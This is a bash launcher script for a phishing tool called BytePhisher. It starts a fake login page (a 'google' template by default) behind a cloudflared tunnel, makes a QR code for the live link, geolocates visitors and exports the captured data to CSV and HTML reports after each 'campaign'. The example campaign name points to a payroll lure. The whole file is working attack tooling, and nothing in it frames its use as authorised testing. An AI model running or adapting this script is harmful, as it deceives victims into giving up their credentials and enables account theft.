#!/usr/bin/env bash
# BytePhisher one-command campaign.
#
#   bash tools/campaign.sh [template] [campaign-name] [tunneler]
#   bash tools/campaign.sh google q3-payroll cloudflared
#
# What it does:
#   1. preflight  — runs the doctor; refuses to start if a blocking check fails
#   2. run        — starts the server + tunnel with a campaign tag,
#                   QR code for the live link, and a live dashboard
#   3. on exit    — writes data/report-<campaign>.html and data/captures-<campaign>.csv
#
# Ctrl+C stops the campaign; the report is written from whatever was captured.
set -uo pipefail

TEMPLATE="${1:-google}"
CAMPAIGN="${2:-campaign-$(date +%Y%m%d-%H%M)}"
TUNNELER="${3:-cloudflared}"

cd "$(dirname "$0")/.." || exit 1
PY=./.venv/bin/python
[ -x "$PY" ] || { echo "[campaign] $PY missing — run: make install"; exit 1; }

REPORT="data/report-${CAMPAIGN}.html"
CSV="data/captures-${CAMPAIGN}.csv"
QR="data/qr-${CAMPAIGN}.png"

echo "[campaign] preflight (bytephisher --doctor)"
if ! $PY bytephisher.py --doctor; then
  echo "[campaign] doctor reported blocking failures — not starting"
  exit 1
fi

write_outputs() {
  echo
  echo "[campaign] writing outputs for '$CAMPAIGN'"
  $PY tools/report.py --campaign "$CAMPAIGN" --out "$REPORT" || true
  $PY bytephisher.py --export "$CSV" --campaign "$CAMPAIGN" 2>/dev/null || true
  echo "[campaign] report : $REPORT"
  echo "[campaign] csv    : $CSV"
  [ -f "$QR" ] && echo "[campaign] qr     : $QR"
}
trap write_outputs EXIT

echo "[campaign] starting '$TEMPLATE' as '$CAMPAIGN' over '$TUNNELER'"

# Run the CLI in the background and forward signals to it, so Ctrl+C (process
# group) and a programmatic SIGINT/SIGTERM aimed at this script both stop the
# campaign and still reach the EXIT trap that writes the report.
$PY bytephisher.py -o "$TEMPLATE" -t "$TUNNELER" --campaign "$CAMPAIGN" \
    --qr "$QR" --geo ipapi &
CHILD=$!

forward() { kill -INT "$CHILD" 2>/dev/null || true; }
trap forward INT TERM

wait "$CHILD"
STATUS=$?
trap - INT TERM
exit "$STATUS"
